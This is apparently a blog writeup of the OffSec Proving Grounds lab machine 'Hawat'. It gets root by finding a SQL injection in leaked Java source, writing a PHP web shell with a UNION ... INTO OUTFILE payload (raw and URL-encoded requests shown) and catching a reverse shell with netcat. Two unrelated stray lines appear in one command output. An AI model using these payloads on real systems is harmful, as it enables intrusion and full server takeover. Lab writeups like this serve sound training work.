---
title: "Proving grounds Play: Hawat"
layout: post
date: 2023-10-16 02:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- PG-Practice
- RCE
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds practice linux machine writeup"
---

## Nmap

```text
22/tcp    open  ssh     OpenSSH 8.4 (protocol 2.0)
17445/tcp open  unknown
30455/tcp open  http    nginx 1.18.0
50080/tcp open  http    Apache httpd 2.4.46 ((Unix) PHP/7.4.15)
```

## 17445/tcp open  unknown

http://192.168.156.147:17445/

![img](/assets/images/CTF/Proving_Grounds/Hawat/web1.png)

Register an user account on the portal.

## 30455/tcp open  http    nginx 1.18.0

http://192.168.156.147:30455/

http://192.168.156.147:30455/phpinfo.php

**Required UInfo**

```text
Document root = /srv/http
server port = 30455
server user = root
```

## 50080/tcp open  http    Apache httpd 2.4.46 ((Unix) PHP/7.4.15)

### Directory discovery

```sh
[11:31:15] 301 -  243B  - /cloud  ->  http://192.168.156.147:50080/cloud/
```

![img](/assets/images/CTF/Proving_Grounds/Hawat/web2.png)

Next cloud login page, use credentials `admin:admin` to login.

![img](/assets/images/CTF/Proving_Grounds/Hawat/web3.png)

Download and extract the `issuetracker.zip` file in the local machine. Open the extracted file in a text editor to review the code.

Upon reviewwing the code, found that the application is vulnerable to sql injection vulnerability.

```java
	@GetMapping("/issue/checkByPriority")
	public String checkByPriority(@RequestParam("priority") String priority, Model model) {
		// 
		// Custom code, need to integrate to the JPA
		//
	    Properties connectionProps = new Properties();
	    connectionProps.put("user", "issue_user");
	    connectionProps.put("password", "ManagementInsideOld797");
        try {
			conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/issue_tracker",connectionProps);
		    String query = "SELECT message FROM issue WHERE priority='"+priority+"'";           //variable priority is not sanitized or no input validation is implemented
            System.out.println(query);
		    Statement stmt = conn.createStatement();
		    stmt.executeQuery(query);

        } catch (SQLException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		
        // TODO: Return the list of the issues with the correct priority
		List<Issue> issues = service.GetAll();
		model.addAttribute("issuesList", issues);
		return "issue_index";
        
	}
```

On the above code the variable `priority` is not properly validated against the injection vulnerabilities and by using `UNION` based injection we can achieve remote code execution.

## Foothold

Login to the application running on `http://192.168.217.147:17445/login` with the registered credentials. Construct a POST request as per the code `/issue/checkByPriority?priority=Normal`.

> Note: GET method is not supported for the endpoint.

```http
POST /issue/checkByPriority?priority=Normal'+UNION+SELECT+sleep(5)+--+ HTTP/1.1
Host: 192.168.217.147:17445
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=56CD439D46124C28A892FBC77124E167
Upgrade-Insecure-Requests: 1
```

SQL injection is confirmed.

**RCE Payload**

```text
Normal' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/srv/http/rce.php" -- 
```

URL encode the payload and send it to the server.

```http
POST /issue/checkByPriority?priority=Normal%27%20UNION%20SELECT%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%22%20INTO%20OUTFILE%20%22%2Fsrv%2Fhttp%2Frce.php%22%20--%20 HTTP/1.1
Host: 192.168.217.147:17445
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=56CD439D46124C28A892FBC77124E167
Upgrade-Insecure-Requests: 1
```

Navigate to the `http://192.168.217.147:30455/rce.php?cmd=id` location to perform code execution.

```sh
naveenj@hackerspace:|22:03|~/proving_grounds/Hawat$ curl 'http://192.168.217.147:30455/rce.php?cmd=id'
Windows 10 keeps telling me to update, why?
Is allowed to use torrent sites in the corporate network?
uid=0(root) gid=0(root) groups=0(root)
```

Create PHP reverse shell file and use port as 443 to get reverse shell. Download the php file to the server and place it on `/srv/http` folder to access it publicly.

> Note: The server only allows port 443 so run python server on the same to download the reverse shell code to the attacking machine.

```sh
naveenj@hackerspace:|22:09|~/proving_grounds/Hawat$ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.45.186] from (UNKNOWN) [192.168.217.147] 55270
Linux hawat 5.10.14-arch1-1 #1 SMP PREEMPT Sun, 07 Feb 2021 22:42:17 +0000 x86_64 GNU/Linux
 02:11:10 up 28 min,  0 users,  load average: 0.06, 0.05, 0.00
USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
uid=0(root) gid=0(root) groups=0(root)
sh: cannot set terminal process group (575): Inappropriate ioctl for device
sh: no job control in this shell
sh-5.1# 
```

**Foothold Obtained**

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).